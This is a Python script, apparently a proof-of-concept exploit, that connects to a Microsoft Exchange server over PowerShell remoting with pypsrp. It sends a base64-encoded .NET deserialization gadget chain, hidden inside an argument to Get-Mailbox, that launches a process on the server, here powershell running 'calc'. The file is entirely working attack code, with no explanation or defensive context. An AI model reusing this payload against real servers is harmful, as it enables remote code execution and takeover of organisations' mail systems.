from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
from pypsrp.complex_objects import ComplexObject, ObjectMeta
import base64


class ExceptionObject(ComplexObject):
    def __init__(self, SerializationData):
        super(ExceptionObject, self).__init__()
        self._adapted_properties = (
            ('SerializationData', ObjectMeta('BA', name='SerializationData')),
        )
        self._types = ['System.Exception', 'System.Object']
        self.SerializationData = SerializationData


wsman = WSMan(server='dc.exchange2016.com', username='administrator', password='',path='powershell', ssl=False, port=80, auth='kerberos', scheme='http',)
with RunspacePool(wsman, configuration_name='Microsoft.Exchange') as pool:
    ps = PowerShell(pool)
    payload = base64.b64decode('AAEAAAD/////AQAAAAAAAAAMAgAAAFpNaWNyb3NvZnQuRXhjaGFuZ2UuTmV0LCBWZXJzaW9uPTE1LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAD1NaWNyb3NvZnQuRXhjaGFuZ2UuU2VjdXJpdHkuQXV0aGVudGljYXRpb24uR2VuZXJpY1NpZElkZW50aXR5CgAAABZHZW5lcmljSWRlbnRpdHkrbV9uYW1lFkdlbmVyaWNJZGVudGl0eSttX3R5cGUYQ2xhaW1zSWRlbnRpdHkrbV92ZXJzaW9uFkNsYWltc0lkZW50aXR5K21fYWN0b3IjQ2xhaW1zSWRlbnRpdHkrbV9hdXRoZW50aWNhdGlvblR5cGUhQ2xhaW1zSWRlbnRpdHkrbV9ib290c3RyYXBDb250ZXh0FkNsYWltc0lkZW50aXR5K21fbGFiZWwjQ2xhaW1zSWRlbnRpdHkrbV9zZXJpYWxpemVkTmFtZVR5cGUjQ2xhaW1zSWRlbnRpdHkrbV9zZXJpYWxpemVkUm9sZVR5cGUhQ2xhaW1zSWRlbnRpdHkrbV9zZXJpYWxpemVkQ2xhaW1zAQEBAwECAQEBASVTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc0lkZW50aXR5AgAAAAYDAAAAAXQGBAAAAAAGBQAAAAMxLjAKCgoKBgYAAAA6aHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZQYHAAAAPGh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZQYIAAAAhApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBNUFVOFVtVnpiM1Z5WTJWRWFXTjBhVzl1WVhKNUNpQWdJQ0FnSUNBZ0lDQWdJQ0FnZUcxc2JuTTlJbWgwZEhBNkx5OXpZMmhsYldGekxtMXBZM0p2YzI5bWRDNWpiMjB2ZDJsdVpuZ3ZNakF3Tmk5NFlXMXNMM0J5WlhObGJuUmhkR2x2YmlJS0lDQWdJQ0FnSUNBZ0lDQWdJQ0I0Yld4dWN6cDRQU0pvZEhSd09pOHZjMk5vWlcxaGN5NXRhV055YjNOdlpuUXVZMjl0TDNkcGJtWjRMekl3TURZdmVHRnRiQ0lLSUNBZ0lDQWdJQ0FnSUNBZ0lDQjRiV3h1Y3pwVGVYTjBaVzA5SW1Oc2NpMXVZVzFsYzNCaFkyVTZVM2x6ZEdWdE8yRnpjMlZ0WW14NVBXMXpZMjl5YkdsaUlnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUhodGJHNXpPa1JwWVdjOUltTnNjaTF1WVcxbGMzQmhZMlU2VTNsemRHVnRMa1JwWVdkdWIzTjBhV056TzJGemMyVnRZbXg1UFhONWMzUmxiU0krQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BFOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpQjRPa3RsZVQwaVRHRjFibU5vUTJGc1l5SWdUMkpxWldOMFZIbHdaU0E5SUNKN0lIZzZWSGx3WlNCRWFXRm5PbEJ5YjJObGMzTjlJaUJOWlhSb2IyUk9ZVzFsSUQwZ0lsTjBZWEowSWlBK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BFOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpNU5aWFJvYjJSUVlYSmhiV1YwWlhKelBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRHhUZVhOMFpXMDZVM1J5YVc1blBuQnZkMlZ5YzJobGJHdzhMMU41YzNSbGJUcFRkSEpwYm1jK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQRk41YzNSbGJUcFRkSEpwYm1jK0xXTWdJbU5oYkdNaUlEd3ZVM2x6ZEdWdE9sTjBjbWx1Wno0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpNU5aWFJvYjJSUVlYSmhiV1YwWlhKelBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDaUFnSUNBZ0lDQWdJQ0FnSUR3dlVtVnpiM1Z5WTJWRWFXTjBhVzl1WVhKNVBncz0L')
    ps.add_cmdlet('Get-Mailbox').add_argument(ExceptionObject(payload)).invoke()
